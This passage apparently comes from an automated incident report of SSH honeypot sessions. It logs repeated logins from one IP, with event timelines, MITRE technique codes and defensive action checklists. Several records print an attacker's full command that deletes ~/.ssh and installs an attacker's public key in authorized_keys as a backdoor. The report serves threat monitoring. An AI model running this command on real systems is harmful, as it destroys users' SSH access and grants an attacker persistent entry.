| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:41:31` | `cowrie.session.connect` |
| `2026-05-05 15:41:31` | `cowrie.client.version` |
| `2026-05-05 15:41:31` | `cowrie.client.kex` |
| `2026-05-05 15:41:32` | `cowrie.login.success` |
| `2026-05-05 15:41:32` | `cowrie.session.params` |
| `2026-05-05 15:41:32` | `cowrie.command.input` |
| `2026-05-05 15:41:32` | `cowrie.command.failed` |
| `2026-05-05 15:41:32` | `cowrie.log.closed` |
| `2026-05-05 15:41:32` | `cowrie.session.params` |
| `2026-05-05 15:41:32` | `cowrie.command.input` |
| `2026-05-05 15:41:32` | `cowrie.session.file_download` |
| `2026-05-05 15:41:32` | `cowrie.log.closed` |
| `2026-05-05 15:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-796189afda21

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:41 |
| **Last Seen** | 2026-05-05 15:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:41:34` | `cowrie.session.connect` |
| `2026-05-05 15:41:34` | `cowrie.client.version` |
| `2026-05-05 15:41:34` | `cowrie.client.kex` |
| `2026-05-05 15:41:34` | `cowrie.login.success` |
| `2026-05-05 15:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad6d4b09ac61

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:42 |
| **Last Seen** | 2026-05-05 15:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:42:31` | `cowrie.session.connect` |
| `2026-05-05 15:42:31` | `cowrie.client.version` |
| `2026-05-05 15:42:31` | `cowrie.client.kex` |
| `2026-05-05 15:42:31` | `cowrie.login.success` |
| `2026-05-05 15:42:32` | `cowrie.session.params` |
| `2026-05-05 15:42:32` | `cowrie.command.input` |
| `2026-05-05 15:42:32` | `cowrie.command.failed` |
| `2026-05-05 15:42:32` | `cowrie.log.closed` |
| `2026-05-05 15:42:32` | `cowrie.session.params` |
| `2026-05-05 15:42:32` | `cowrie.command.input` |
| `2026-05-05 15:42:32` | `cowrie.session.file_download` |
| `2026-05-05 15:42:32` | `cowrie.log.closed` |
| `2026-05-05 15:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d652c8c9dcd0

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:42 |
| **Last Seen** | 2026-05-05 15:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:42:34` | `cowrie.session.connect` |
| `2026-05-05 15:42:34` | `cowrie.client.version` |
| `2026-05-05 15:42:34` | `cowrie.client.kex` |
| `2026-05-05 15:42:34` | `cowrie.login.success` |
| `2026-05-05 15:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8d7e42f8db4

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:43 |
| **Last Seen** | 2026-05-05 15:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:43:29` | `cowrie.session.connect` |
| `2026-05-05 15:43:29` | `cowrie.client.version` |
| `2026-05-05 15:43:29` | `cowrie.client.kex` |
| `2026-05-05 15:43:29` | `cowrie.login.success` |
| `2026-05-05 15:43:29` | `cowrie.session.params` |
| `2026-05-05 15:43:29` | `cowrie.command.input` |
| `2026-05-05 15:43:29` | `cowrie.command.failed` |
| `2026-05-05 15:43:29` | `cowrie.log.closed` |
| `2026-05-05 15:43:30` | `cowrie.session.params` |
| `2026-05-05 15:43:30` | `cowrie.command.input` |
| `2026-05-05 15:43:30` | `cowrie.session.file_download` |
| `2026-05-05 15:43:30` | `cowrie.log.closed` |
| `2026-05-05 15:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cf1fe0010c7

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:43 |
| **Last Seen** | 2026-05-05 15:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:43:31` | `cowrie.session.connect` |
| `2026-05-05 15:43:31` | `cowrie.client.version` |
| `2026-05-05 15:43:31` | `cowrie.client.kex` |
| `2026-05-05 15:43:32` | `cowrie.login.success` |
| `2026-05-05 15:43:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b5fea640037

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:46 |
| **Last Seen** | 2026-05-05 15:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:46:29` | `cowrie.session.connect` |
| `2026-05-05 15:46:29` | `cowrie.client.version` |
| `2026-05-05 15:46:29` | `cowrie.client.kex` |
| `2026-05-05 15:46:30` | `cowrie.login.success` |
| `2026-05-05 15:46:30` | `cowrie.session.params` |
| `2026-05-05 15:46:30` | `cowrie.command.input` |
| `2026-05-05 15:46:30` | `cowrie.command.failed` |
| `2026-05-05 15:46:30` | `cowrie.log.closed` |
| `2026-05-05 15:46:30` | `cowrie.session.params` |
| `2026-05-05 15:46:30` | `cowrie.command.input` |
| `2026-05-05 15:46:30` | `cowrie.session.file_download` |
| `2026-05-05 15:46:30` | `cowrie.log.closed` |
| `2026-05-05 15:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-659c508ee2d5

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:46 |
| **Last Seen** | 2026-05-05 15:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:46:32` | `cowrie.session.connect` |
| `2026-05-05 15:46:32` | `cowrie.client.version` |
| `2026-05-05 15:46:32` | `cowrie.client.kex` |
| `2026-05-05 15:46:33` | `cowrie.login.success` |
| `2026-05-05 15:46:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1593964f99fe

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:47 |
| **Last Seen** | 2026-05-05 15:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:47:27` | `cowrie.session.connect` |
| `2026-05-05 15:47:27` | `cowrie.client.version` |
| `2026-05-05 15:47:27` | `cowrie.client.kex` |
| `2026-05-05 15:47:27` | `cowrie.login.success` |
| `2026-05-05 15:47:28` | `cowrie.session.params` |
| `2026-05-05 15:47:28` | `cowrie.command.input` |
| `2026-05-05 15:47:28` | `cowrie.command.failed` |
| `2026-05-05 15:47:28` | `cowrie.log.closed` |
| `2026-05-05 15:47:28` | `cowrie.session.params` |
| `2026-05-05 15:47:28` | `cowrie.command.input` |
| `2026-05-05 15:47:28` | `cowrie.session.file_download` |
| `2026-05-05 15:47:28` | `cowrie.log.closed` |
| `2026-05-05 15:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97eace7e0081

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:47 |
| **Last Seen** | 2026-05-05 15:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:47:30` | `cowrie.session.connect` |
| `2026-05-05 15:47:30` | `cowrie.client.version` |
| `2026-05-05 15:47:30` | `cowrie.client.kex` |
| `2026-05-05 15:47:30` | `cowrie.login.success` |
| `2026-05-05 15:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41924bfb40d2

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:48 |
| **Last Seen** | 2026-05-05 15:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:48:24` | `cowrie.session.connect` |
| `2026-05-05 15:48:24` | `cowrie.client.version` |
| `2026-05-05 15:48:24` | `cowrie.client.kex` |
| `2026-05-05 15:48:25` | `cowrie.login.success` |
| `2026-05-05 15:48:25` | `cowrie.session.params` |
| `2026-05-05 15:48:25` | `cowrie.command.input` |
| `2026-05-05 15:48:25` | `cowrie.command.failed` |
| `2026-05-05 15:48:25` | `cowrie.log.closed` |
| `2026-05-05 15:48:25` | `cowrie.session.params` |
| `2026-05-05 15:48:25` | `cowrie.command.input` |
| `2026-05-05 15:48:25` | `cowrie.session.file_download` |
| `2026-05-05 15:48:25` | `cowrie.log.closed` |
| `2026-05-05 15:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaf5e54ecdfc

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:48 |
| **Last Seen** | 2026-05-05 15:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:48:27` | `cowrie.session.connect` |
| `2026-05-05 15:48:27` | `cowrie.client.version` |
| `2026-05-05 15:48:27` | `cowrie.client.kex` |
| `2026-05-05 15:48:28` | `cowrie.login.success` |
| `2026-05-05 15:48:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb29077a21ae

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:49 |
| **Last Seen** | 2026-05-05 15:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:49:20` | `cowrie.session.connect` |
| `2026-05-05 15:49:20` | `cowrie.client.version` |
| `2026-05-05 15:49:21` | `cowrie.client.kex` |
| `2026-05-05 15:49:21` | `cowrie.login.success` |
| `2026-05-05 15:49:21` | `cowrie.session.params` |
| `2026-05-05 15:49:21` | `cowrie.command.input` |
| `2026-05-05 15:49:21` | `cowrie.command.failed` |
| `2026-05-05 15:49:21` | `cowrie.log.closed` |
| `2026-05-05 15:49:22` | `cowrie.session.params` |
| `2026-05-05 15:49:22` | `cowrie.command.input` |
| `2026-05-05 15:49:22` | `cowrie.session.file_download` |
| `2026-05-05 15:49:22` | `cowrie.log.closed` |
| `2026-05-05 15:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebd712ab64bf

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:49 |
| **Last Seen** | 2026-05-05 15:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:49:23` | `cowrie.session.connect` |
| `2026-05-05 15:49:23` | `cowrie.client.version` |
| `2026-05-05 15:49:23` | `cowrie.client.kex` |
| `2026-05-05 15:49:24` | `cowrie.login.success` |
| `2026-05-05 15:49:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7478aa250eab

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:50 |
| **Last Seen** | 2026-05-05 15:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:50:19` | `cowrie.session.connect` |
| `2026-05-05 15:50:19` | `cowrie.client.version` |
| `2026-05-05 15:50:19` | `cowrie.client.kex` |
| `2026-05-05 15:50:20` | `cowrie.login.success` |
| `2026-05-05 15:50:20` | `cowrie.session.params` |
| `2026-05-05 15:50:20` | `cowrie.command.input` |
| `2026-05-05 15:50:20` | `cowrie.command.failed` |
| `2026-05-05 15:50:20` | `cowrie.log.closed` |
| `2026-05-05 15:50:20` | `cowrie.session.params` |
| `2026-05-05 15:50:20` | `cowrie.command.input` |
| `2026-05-05 15:50:20` | `cowrie.session.file_download` |
| `2026-05-05 15:50:20` | `cowrie.log.closed` |
| `2026-05-05 15:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-402bb9fbe2d4

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:50 |
| **Last Seen** | 2026-05-05 15:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:50:22` | `cowrie.session.connect` |
| `2026-05-05 15:50:22` | `cowrie.client.version` |
| `2026-05-05 15:50:22` | `cowrie.client.kex` |
| `2026-05-05 15:50:23` | `cowrie.login.success` |
| `2026-05-05 15:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.140[.]209` to AbuseIPDB if not already reported
- [ ] Block `36.92.140[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4300d8380472

| Field | Detail |
|---|---|
| **Source IP** | `36.92.140[.]209` |
| **First Seen** | 2026-05-05 15:52 |
| **Last Seen** | 2026-05-05 15:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-05 15:52:19` | `cowrie.session.connect` |
| `2026-05-05 15:52:19` | `cowrie.client.version` |
| `2026-05-05 15:52:19` | `cowrie.client.kex` |
| `2026-05-05 15:52:19` | `cowrie.login.success` |
| `2026-05-05 15:52:19` | `cowrie.session.params` |
| `2026-05-05 15:52:19` | `cowrie.command.input` |
